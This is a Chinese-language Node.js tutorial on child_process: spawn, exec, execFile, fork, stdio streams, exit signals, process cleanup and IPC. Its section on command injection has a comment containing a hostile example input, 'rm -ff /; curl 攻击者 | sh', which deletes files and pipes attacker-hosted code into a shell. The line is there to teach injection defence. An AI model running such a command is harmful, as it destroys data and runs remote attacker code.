# child_process：spawn、exec、fork

> 目标：Node 是单线程的（呼应 node-event-loop），但它可以**启动别的进程**——跑外部命令、调用系统工具、派生一个 Node 子进程干重活。掌握 `child_process` 的四个 API（`spawn`/`execFile`/`exec`/`fork`）、它们的**流式 stdout/stderr**、**退出码与信号**、**`shell:true` 的注入风险**，以及父子**IPC 消息通道**（`fork` + `send`/`message`）。这是从"一个进程"迈向"多进程协作"的第一步（下一关 cluster、再下关 worker_threads）。

---

## 一、四个 API 一张表

| API | 返回 | 输出 | 用途 |
| --- | --- | --- | --- |
| `spawn(cmd, args[], opts)` | ChildProcess，流式 | `child.stdout` 是**流** | 长时间/大输出/交互式命令（git、ffmpeg、tail） |
| `execFile(cmd, args[], opts, cb)` | 缓冲后回调 | 攒成字符串再给 cb | 执行**单个程序**、输出不大、不想开 shell |
| `exec(cmdString, opts, cb)` | 缓冲后回调 | 同上，但**经 shell 解析** | 需要管道/重定向/通配符等 shell 特性时 |
| `fork(modulePath, args[], opts)` | 带 IPC 的 Node 子进程 | 同上 | 专门启动**另一个 Node 脚本**并通信 |

共同点：都返回一个 `ChildProcess`，它是 **EventEmitter**（`'spawn'`/`'exit'`/`'close'`/`'error'`/`'message'`，呼应 node-events），`stdio` 是三个流（0/1/2，呼应 node-streams）。

```js
import { spawn, execFile, fork } from "node:child_process";

const ls = spawn("ls", ["-la"]);
ls.stdout.on("data", (c) => process.stdout.write(c));   // 流式，边出边处理
ls.stderr.on("data", (c) => process.stderr.write(c));
ls.on("close", (code) => console.log("退出码", code));

execFile("git", ["rev-parse", "HEAD"], (err, stdout, stderr) => {   // 缓冲，error-first（呼应 node-async-errors）
  if (err) throw err;                 // err.code/killed/signal 都在
  console.log(stdout.trim());
});
```

---

## 二、spawn / exec / execFile 的取舍与 `shell:true` 陷阱

- **`exec` vs `execFile`**：`exec("cmd | grep x > f")` 会**经 shell** 解析整串（支持管道、`$VAR`、通配符）；`execFile(cmd, args)` **不经 shell**，直接把 args 传给程序——更快、且**避免命令注入**。
- **命令注入**：把用户输入拼进 `exec` 的命令串是**高危漏洞**：

```js
// ❌ 灾难：用户输入 rm -ff /; curl 攻击者 | sh
exec(`convert ${userFile} out.png`);
// ✅ 用 execFile + 数组参数，不经过 shell，输入只当"文件名"
execFile("convert", [userFile, "out.png"], cb);
```

- `spawn` 默认**不开 shell**；若确需 shell（Windows 跑 `.bat` 等）传 `{ shell: true }`，此时**同样要防注入**（别把不可信输入拼进命令串）。
- `maxBuffer`：`exec`/`execFile` 缓冲输出有上限（默认约 1MB），超过会杀进程——大输出请用 `spawn` 流式读（呼应 node-buffer/fs 大文件思路）。

---

## 三、退出码与信号：怎么知道子进程"成/败/被杀"

```js
child.on("exit", (code, signal) => {
  // code: 正常退出时的退出码（0=成功）；被信号杀死时为 null
  // signal: 若被信号终止，给出如 'SIGTERM'/'SIGKILL'
});
```

- **`'exit'`** 在进程终止时触发（可能 stdio 缓冲还没 flush 完）；**`'close'`** 在 stdio 流也关闭后触发——要"确保输出都读完了再收尾"用 `'close'`（呼应 node-fs 句柄、node-event-loop）。
- Unix 惯例：`0` 成功、非 0 失败（`126` 不可执行、`127` 命令未找到）。`spawn` 找不到命令时 `error` 事件 + `code=ENOENT`。
- `err.killed === true` 表示是因超时/主动 kill 被杀（见下节 timeout）。

---

## 四、生命周期控制：kill、timeout、detached

```js
const child = spawn("slow-tool", { timeout: 5000 });   // 超时自动 SIGTERM
child.on("exit", (code, signal) => signal === "SIGTERM" && console.log("超时被终止"));

// 主动杀：
child.kill("SIGTERM");     // 温和；需要更强可 SIGKILL（不给清理机会）

// 脱离父进程、独立存活（守护式）：
spawn("nohup-task", { detached: true, stdio: "ignore" }).unref();
```

**孤儿进程陷阱**：`child.kill()` 只杀**直接子进程**，若它又起了孙进程（尤其 `shell:true` 时 shell 是子、真命令是孙），孙进程可能存活。彻底清理要用**进程组**（`detached:true` 起新组，再 `process.kill(-pid)` 杀整组）——容器里"僵尸进程占内存"常见根因（呼应 node-deploy-perf 信号处理）。

---

## 五、fork + IPC：父子双向消息

`fork` 是 `spawn` 的特化——启动**另一个 Node 进程**并自动建立 **IPC 通道**（`'message'` 事件，底层 Unix socket/命名管道）。父子通过 `send`/`message` 传**可结构化克隆的值**：

```js
// parent.js
import { fork } from "node:child_process";
const w = fork("./worker.js");
w.send({ task: "sum", n: 1e7 });
w.on("message", (r) => { console.log("子进程结果", r); w.kill(); });

// worker.js
process.on("message", (msg) => {
  let s = 0; for (let i = 0; i < msg.n; i++) s += i;
  process.send({ result: s });          // 回传给父
});
```

- 消息会被**序列化（JSON 或结构化克隆）**，别发函数字符串大对象；可 `send(msg, { transfer: [handle] })` 转移 net/tcp **句柄**（cluster 就是这么把连接分给 worker 的，呼应下一关）。
- 父进程退出前若不 `w.kill()`（或子 `process.disconnect()`），子可能残留 → 父进程"关不掉"（活跃句柄，呼应 node-event-loop）。

---

## 六、stdio 与管道：把子进程接进流世界

`spawn` 的 `stdio` 选项决定三个描述符怎么接：`'pipe'`（默认，父子间管道）/`'inherit'`（共享父的，直接透传到终端）/`'ignore'`/文件 fd/另一个流。

```js
// 把子进程 stdout 直接接到本进程 stdout（像 shell 管道）
spawn("ls", { stdio: "inherit" });

// 给子进程喂 stdin（Writable 流，呼应 node-streams）
const cat = spawn("cat");
cat.stdin.end("hello from parent\n");
```

`child.stdout` 是 Readable，可 `pipeline(child.stdout, fs.createWriteStream('log'))`（呼应 node-stream-pipeline）——"命令输出的流式落盘/过滤"。

---

## 七、和 worker_threads / cluster 的分工（全景）

- **child_process**：跑**外部程序**，或需要**完全独立的进程**（各自 V8 堆、无共享内存、崩溃互不影响、启动开销大）；`fork` 用于"多核跑多个 Node 实例 + IPC"。
- **cluster**：`fork` 的特化应用——**共享监听端口**、多进程分摊 HTTP 连接（下一关）。
- **worker_threads**：**同进程内的线程**，共享 `ArrayBuffer`、适合 CPU 密集（再下关）。

选择直觉：**要跑非 Node 的命令 → child_process；要 HTTP 多核扩展 → cluster；要把一段重计算挪出主线程并共享内存 → worker_threads。**

---

## 八、自检清单

- [ ] `spawn`/`exec`/`execFile`/`fork` 分别适合什么？输出是流还是缓冲？
- [ ] 为什么把用户输入拼进 `exec` 会命令注入？`execFile` 为何更安全？
- [ ] `'exit'` 和 `'close'` 区别？被信号杀死时 `code`/`signal` 是什么？
- [ ] `child.kill()` 为什么可能留下孤儿/孙进程？怎么彻底清理？
- [ ] `fork` 的 IPC 能传什么、不能传什么？句柄 transfer 有何用？
- [ ] 什么时候该用 child_process，什么时候该用 worker_threads/cluster？

---

## 🚀 部署预告

- 本关 `fork`+句柄 transfer 正是下一关 **node-cluster** 的地基：cluster 用多个 worker 进程**共享一个监听 socket** 分摊连接（呼应第五节）；
- CI/CD、脚本工具里"调用 git/docker/npm"都是 child_process（呼应 node-cli、node-publish）；
- `detached`/信号/进程组清理，与 **node-deploy-perf** 的 graceful shutdown（SIGTERM 处理、别留僵尸）直接相关；
- 子进程"崩溃互不影响、各自独立堆"与 worker_threads"共享内存但有连坐风险"的对比，在 **node-workers** 展开。

下一关进入 **node-cluster**：单线程 Node 如何用多核、优雅重启。
